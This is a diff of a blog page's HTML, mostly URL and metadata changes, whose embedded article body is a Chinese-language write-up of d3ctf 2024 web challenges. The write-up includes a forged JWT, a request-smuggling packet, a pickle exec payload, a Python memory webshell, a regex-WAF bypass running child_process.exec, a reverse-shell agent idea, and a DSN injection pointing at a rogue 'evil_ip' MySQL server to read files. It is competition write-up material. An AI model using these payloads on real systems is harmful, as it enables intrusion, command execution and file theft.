@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>d3ctf-2024-web-wp | zoiltin&#39;s Blog</title>
 <meta name="keywords" content="">
 <meta name="description" content="d^3ctf 2024 web方向wp">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/posts/d3ctf-2024-web-wp/">
+<link rel="canonical" href="https://zoiltin.github.io/posts/d3ctf-2024-web-wp/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" integrity="sha256-1yREUm1&#43;y9sAFUOKf6iQVKZYv3WdBULi5d&#43;BzpS0k&#43;4=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/d3ctf-2024-web-wp/">
+<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/d3ctf-2024-web-wp/">
 <noscript>
     <style>
         #theme-toggle,
@@ -56,6 +56,71 @@
 
     </style>
 </noscript>
+  
+
+<meta property="og:url" content="https://zoiltin.github.io/posts/d3ctf-2024-web-wp/">
+  <meta property="og:site_name" content="zoiltin&#39;s Blog">
+  <meta property="og:title" content="d3ctf-2024-web-wp">
+  <meta property="og:description" content="d^3ctf 2024 web方向wp">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-04-28T20:35:50+00:00">
+    <meta property="article:modified_time" content="2024-04-28T20:35:50+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="d3ctf-2024-web-wp">
+<meta name="twitter:description" content="d^3ctf 2024 web方向wp">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zoiltin.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "d3ctf-2024-web-wp",
+      "item": "https://zoiltin.github.io/posts/d3ctf-2024-web-wp/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "d3ctf-2024-web-wp",
+  "name": "d3ctf-2024-web-wp",
+  "description": "d^3ctf 2024 web方向wp",
+  "keywords": [
+    
+  ],
+  "articleBody": "d3pythonhttp 解决，一血\njwt绕过 def get_key(kid): key = \"\" dir = \"/app/\" try: with open(dir+kid, \"r\") as f: key = f.read() except: pass print(key) return key def verify_token(token): header = jwt.get_unverified_header(token) kid = header[\"kid\"] key = get_key(kid) try: payload = jwt.decode(token, key, algorithms=[\"HS256\"]) return True except: return False 验证jwt时kid控制密钥文件路径，如果设置的密钥文件不存在，则key为空，所以构造空秘钥以及一个不存在的文件即可：\nprint(jwt.encode({\"username\":\"admin\",\"isadmin\":true}, key, algorithm=\"HS256\", headers={\"kid\": \"frontend_keyasdasd\"})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M 解析差异 一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。 经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。\nheaders = {key: value for (key, value) in request.headers if key != 'Host'} 除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。 数据包：\nPOST /admin HTTP/1.1 Host: 192.168.72.137:8081 Content-Length: 192 Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M Transfer-Encoding: chunKed dc BackdoorPasswordOnlyForAdmin 0 后端只读取前192个字符，后面的BackdoorPasswordOnlyForAdmin被舍弃。绕过。 base64解码后pickle反序列化。\nimport pickle import os import base64 payload = \"\"\" print(1) \"\"\" class test: def __reduce__(self): return (exec,(payload,)) a = test() b = base64.b64encode(pickle.dumps(a)) print(b) 突破内网 题目不出网，可以试试整个类似内存马的东西（从dubhe ctf 2024中学到的）。 后端存在以下路由：\nurls = ( '/', 'index', '/backdoor', 'backdoor' ) web.config.debug = False app = web.application(urls, globals()) class index: def GET(self): return \"welcome to the backend!\" 对应前端代码：\n@app.route('/backend', methods=['GET', 'POST']) def proxy_to_backend(): forward_url = \"python-backend:8080\" conn = http.client.HTTPConnection(forward_url) method = request.method headers = {key: value for (key, value) in request.headers if key != \"Host\"} data = request.data path = \"/\" if request.query_string: path += \"?\" + request.query_string.decode() conn.request(method, path, body=data, headers=headers) response = conn.getresponse() return response.read() response = conn.getresponse() 这段代码意味着后端处理的数据后会回显到前端，而/backdoor路由不会，所以我们可以将后端index路由覆盖为内存马。 使用exec函数执行以下python代码就可以将index路由的GET方法覆盖(asd参数要保留，因为服务器调用的时候会传一个self参数)：\ndef test(asd): return \"pwned\" index.GET = test 访问index路由是可以带get参数：\nif request.query_string: path += \"?\" + request.query_string.decode() 所以内存马实现如下：\ndef test(asd): cmd = web.input().cmd return __import__('os').popen(cmd).read() index.GET = test stack_overflow 解决，一血\n题目用nodejs模拟了一个栈溢出。 关键代码：\nlet respond = {} let stack = [] let getStack = function (address) { if (address - pie \u003e= 0 \u0026\u0026 address - pie \u003c 0x10000) return stack[address - pie] return 0 } let getIndex = function (address) { return address - pie } let read = function (fd, buf, count) { let ori = req.body[fd] if (ori.length \u003c count) { count = ori.length } if (typeof ori !== \"string\" \u0026\u0026 !Array.isArray(ori)) return res.json({\"err\": \"hack!\"}) for (let i = 0; i \u003c count; i++){ if (waf(ori[i])) return res.json({\"err\": \"hack!\"}) stack[getIndex(buf) + i] = ori[i] } } let write = function (fd, buf, count) { if (!respond.hasOwnProperty(fd)) { respond[fd] = [] } for (let i = 0; i \u003c count; i++){ respond[fd].push(getStack(buf + i)) } } let run = function (address) { let continuing = 1; while (continuing) { switch (getStack(address)) { case \"read\": let r_fd = stack.pop() let read_addr = stack.pop() if (read_addr.startsWith(\"{{\") \u0026\u0026 read_addr.endsWith(\"}}\")) { read_addr = pie + eval(read_addr.slice(2,-2).replace(\"stack\", (stack.length - 1).toString())) } read(r_fd, parseInt(read_addr), parseInt(stack.pop())) break; case \"write\": let w_fd = stack.pop() let write_addr = stack.pop() if (write_addr.startsWith(\"{{\") \u0026\u0026 write_addr.endsWith(\"}}\")) { write_addr = pie + eval(write_addr.slice(2,-2).replace(\"stack\", (stack.length - 1).toString())) } write(w_fd, parseInt(write_addr), parseInt(stack.pop())) break; case \"exit\": continuing = 0; break; case \"call_interface\": let numOfArgs = stack.pop() let cmd = stack.pop() let args = [] for (let i = 0; i \u003c numOfArgs; i++) { args.push(stack.pop()) } cmd += \"('\" + args.join(\"','\") + \"')\" let result = vm.runInNewContext(cmd) stack.push(result.toString()) break; case \"push\": let numOfElem = stack.pop() let elemAddr = parseInt(stack.pop()) for (let i = 0; i \u003c numOfElem; i++) { stack.push(getStack(elemAddr + i)) } break; default: stack.push(getStack(address)) break; } address += 1 } } let code = `0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 28 [[ 0 ]] stdin read Started Convertion... Your input is: 2 [[short - 3]] stdout write 5 [[ 0 ]] stdout write ... 1 [[short - 2]] stdout write [[ 0 ]] 5 push (function (...a){ return a.map(char=\u003echar.charCodeAt(0)).join(' ');}) 5 call_interface Ascii is: 1 [[short - 2]] result write 1 {{ stack - 2 }} result write Ascii is: 1 [[short - 2]] stdout write 1 {{ stack - 3 }} stdout write ok 1 [[short - 2]] status write exit` code = code.split('\\n'); for (let i = 0; i \u003c code.length; i++){ stack.push(code[i]) if (stack[i].startsWith(\"[[\") \u0026\u0026 stack[i].endsWith(\"]]\")) { stack[i] = (pie + eval(stack[i].slice(2,-2).replace(\"short\", i.toString()))).toString() } } run(pie + 0) return res.json(respond) 首先第一步操作read，从stdin读取，地址为[[ 0 ]] =\u003e pie，最大读取长度为28。但是code初始只给了20个0空位，也就是说如果读入28个，正好会把第二个操作write的读取地址覆盖，也就是可以控制write函数的读取地址。 waf过滤不全：\nfunction waf(str) { let pattern = /(call_interface)|\\{\\{.*?\\}\\}/g; return str.match(pattern) } 仔细看write函数，如果地址以{{开头，}}结尾，会将中间的数据传给eval函数而正则表达式.*不能匹配换行，所以可以直接使用{{\\nrequire('child_process').exec('id')}}执行命令。read函数可以是字符串也可以是数组，所以可以传此地址。第28位为要执行的命令，27位为传入的数据的长度，写28。\n{\"stdin\":[\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"28\",\"{{\\nrequire('child_process').exec('ls / \u003e /app/index.html')}}\"]} 题目环境有个奇怪的地方，本地环境需要/readflag，直接读flag读不出来，但远程环境/readflag读不出来，直接读flag却可以了，dockerfile里的root用户密码也没用上，感觉怪怪的。\nmoonbox 解决\n题目给了个moonbox的后台，flag在moonbox-server容器内。 官方的流程图（录制模式） moonbox有自定义agent的功能，官方文档：\n已修改moonbox-agent 如修改过moonbox-agent代码，那么需要把修改过的agent代码重新打包。打包步骤如下 step1：maven打包(可选) 执行 mvn clean install操作 step2：打包moonbox-agent 执行打包命令，命令路径为 /moonbox-agent/moonbox-java-agent/bin sh ./install-local-agent.sh step3：agent包上传 moonbox-agent “文件更新”上传包，可以选择step2打包生成的 agengt文件即可。\n根据流程，我们可以修改agent能够在JVM所在机器中执行任意shell脚本。 不过呢，使用mvn打包的话容易报错，直接在.sandbox-module/bin/start-remote-agent.sh中写入反弹shell的命令。然后打包上传即可（moonbox-agent）。 目录结构：\n.sandbox-module/ bin/ install-local-agent.sh start-remote-agent.sh 正常版本在local-agent目录下，可以参考着改。\n有个坑，nginx不允许传大文件，可以把除shell脚本以外的文件删除，不影响执行。 连接JVM机器需要ssh连接，而容器ssh为弱口令root:123456，配置好录制流量即可执行shell脚本。\nDoctor 未解决\n默认密码和jwt key都改了。\nwebsocket可以绕过部分jwt限制。 对于recoder的验证，如果是websocket直接通过。\nfunc SuperRecorderGroup() yee.HandlerFunc { return func(c yee.Context) (err error) { if c.IsWebsocket() { return nil } role := new(lib.Token).JwtParse(c) if role.IsRecord { return } return c.ServerError(http.StatusForbidden, \"非法越权操作！\") } } 对于jwt也是\nreturn func(c yee.Context) (err error) { // cause upgrade websocket will clear custom header // when header add jwt bearer that panic if c.IsWebsocket() { return } 但是没有SuperManageGroup权限。只能获得普通用户权限。\n然后就卡住了~~\n赛后复现 越权之后可以访问GET /api/v2/fetch/fields\nfunc FetchTableInfo(c yee.Context) (err error) { u := new(_FetchBind) if err = c.Bind(u); err != nil { c.Logger().Error(err.Error()) return c.JSON(http.StatusOK, common.ERR_REQ_BIND) } if u.DataBase != \"\" \u0026\u0026 u.Table != \"\" { if err := u.FetchTableFieldsOrIndexes(); err != nil { c.Logger().Critical(err.Error()) } return c.JSON(http.StatusOK, common.SuccessPayload(map[string]interface{}{\"rows\": u.Rows, \"idx\": u.Idx})) } return c.JSON(http.StatusOK, common.ERR_COMMON_MESSAGE(errors.New(i18n.DefaultLang.Load(i18n.INFO_LIBRARY_NAME_TABLE_NAME)))) } 调用FetchTableFieldsOrIndexes函数：\nfunc (u *_FetchBind) FetchTableFieldsOrIndexes() error { var s model.CoreDataSource model.DB().Where(\"source_id =?\", u.SourceId).First(\u0026s) ps := lib.Decrypt(model.JWT, s.Password) db, err := model.NewDBSub(model.DSN{ Username: s.Username, Password: ps, Host: s.IP, Port: s.Port, DBName: u.DataBase, CA: s.CAFile, Cert: s.Cert, Key: s.KeyFile, }) if err != nil { return err } defer model.Close(db) if err := db.Raw(fmt.Sprintf(\"SHOW FULL FIELDS FROM `%s`.`%s`\", u.DataBase, u.Table)).Scan(\u0026u.Rows).Error; err != nil { return err } if err := db.Raw(fmt.Sprintf(\"SHOW INDEX FROM `%s`.`%s`\", u.DataBase, u.Table)).Scan(\u0026u.Idx).Error; err != nil { return err } return nil } 此时数据库中没有DataSource数据，所以s为空，所以后面的DSN中只有DBName可控。 model.NewDBSub：\nfunc NewDBSub(dsn DSN) (*gorm.DB, error) { d, err := InitDSN(dsn) if err != nil { return nil, err } db, err := gorm.Open(drive.New(drive.Config{ DSN: d, DefaultStringSize: 256, // string 类型字段的默认长度 SkipInitializeWithVersion: false, // 根据当前 MySQL 版本自动配置 }), \u0026gorm.Config{}) if err != nil { return nil, err } return db, nil } InitDSN会将dsn序列化。 InitDSN：\nfunc InitDSN(dsn DSN) (string, error) { isTLS := false if dsn.CA != \"\" \u0026\u0026 dsn.Cert != \"\" \u0026\u0026 dsn.Key != \"\" { isTLS = true certPool := x509.NewCertPool() if ok := certPool.AppendCertsFromPEM([]byte(dsn.CA)); !ok { return \"\", fmt.Errorf(\"failed to append ca certs\") } clientCert := make([]tls.Certificate, 0, 1) certs, err := tls.X509KeyPair([]byte(dsn.Cert), []byte(dsn.Key)) if err != nil { return \"\", err } clientCert = append(clientCert, certs) _ = mmsql.RegisterTLSConfig(\"custom\", \u0026tls.Config{ RootCAs: certPool, Certificates: clientCert, InsecureSkipVerify: true, }) } cfg := mmsql.Config{ User: dsn.Username, Passwd: dsn.Password, Addr: fmt.Sprintf(\"%s:%d\", dsn.Host, dsn.Port), //IP:PORT Net: \"tcp\", DBName: dsn.DBName, Loc: time.Local, AllowNativePasswords: true, ParseTime: true, } if isTLS == true { cfg.TLSConfig = \"custom\" } return cfg.FormatDSN(), nil } cfg中依然只有DBName可控。 cfg.FormatDSN()：\nfunc (cfg *Config) FormatDSN() string { var buf bytes.Buffer // [username[:password]@] if len(cfg.User) \u003e 0 { buf.WriteString(cfg.User) if len(cfg.Passwd) \u003e 0 { buf.WriteByte(':') buf.WriteString(cfg.Passwd) } buf.WriteByte('@') } // [protocol[(address)]] if len(cfg.Net) \u003e 0 { buf.WriteString(cfg.Net) if len(cfg.Addr) \u003e 0 { buf.WriteByte('(') buf.WriteString(cfg.Addr) buf.WriteByte(')') } } // /dbname buf.WriteByte('/') buf.WriteString(cfg.DBName) // [?param1=value1\u0026...\u0026paramN=valueN] hasParam := false if cfg.AllowAllFiles { hasParam = true buf.WriteString(\"?allowAllFiles=true\") } 生成DSN：user:pass@tcp(address:port)/dbname?param=asd，其中dbname可控。 解析DSN时从后往前找斜杠：\nfunc ParseDSN(dsn string) (cfg *Config, err error) { // New config with some default values cfg = NewConfig() // [user[:password]@][net[(addr)]]/dbname[?param1=value1\u0026paramN=valueN] // Find the last '/' (since the password or the net addr might contain a '/') 所以设置dbname为user:pass@tcp(evil_ip:port)/test?allowAllFiles=true\u0026可以使服务器连接恶意mysql服务器，前面的原始的address就被忽略了，开启allowAllFiles可以读取文件。\n",
+  "wordCount" : "1167",
+  "inLanguage": "en",
+  "datePublished": "2024-04-28T20:35:50Z",
+  "dateModified": "2024-04-28T20:35:50Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zoiltin.github.io/posts/d3ctf-2024-web-wp/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zoiltin's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zoiltin.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -73,7 +138,7 @@
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -99,17 +164,17 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/" title="Home">
+                <a href="https://zoiltin.github.io/" title="Home">
                     <span>Home</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/posts" title="Posts">
+                <a href="https://zoiltin.github.io/posts" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about" title="About">
+                <a href="https://zoiltin.github.io/about" title="About">
                     <span>About</span>
                 </a>
             </li>
@@ -632,7 +697,7 @@ cfg.FormatDSN()：</p>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2024 <a href="http://localhost:1313/">zoiltin&#39;s Blog</a></span> · 
+        <span>&copy; 2024 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 
 
     <span>
         Powered by
